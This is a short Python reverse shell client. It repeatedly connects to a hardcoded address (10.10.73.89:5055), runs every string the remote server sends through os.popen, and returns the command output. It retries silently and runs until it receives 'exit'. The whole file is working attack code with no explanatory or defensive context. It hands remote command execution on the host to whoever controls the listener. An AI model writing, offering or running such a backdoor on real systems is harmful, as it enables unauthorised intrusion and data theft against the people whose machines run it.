import platform
import socket
import subprocess
import os
import time
        

IP='10.10.73.89'
Port=5055
connect_out = True
while connect_out:
    try :
        with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
            s.connect((IP,Port))
            # system_info = platform.uname()
            # host_name = system_info.node
            # s.send(host_name.encode('utf-8'))
     
            connect= True
            while connect :
                try :
                    # print("conect with server")
                    data=s.recv(1024)
                    result=data.decode('utf-8')
                    print(data)
                    text=os.popen(f"{result}").read()
                    cmd=str(text)
                    error="не явияется"
                    print(cmd)
                    if result=="exit" :
                        connect=False
                        # print("connect closed with server")
                    elif text in error :
                        err="error code"
                        s.send(err.encode())
                    elif data :
                        # print("commond success")
                        s.send(cmd.encode('cp1251'))
                except :
                    # print("connection closed !!!")
                    connect=False
                time.sleep(1)
    except :
        pass
        #  print("no connection...")
    time.sleep(1)
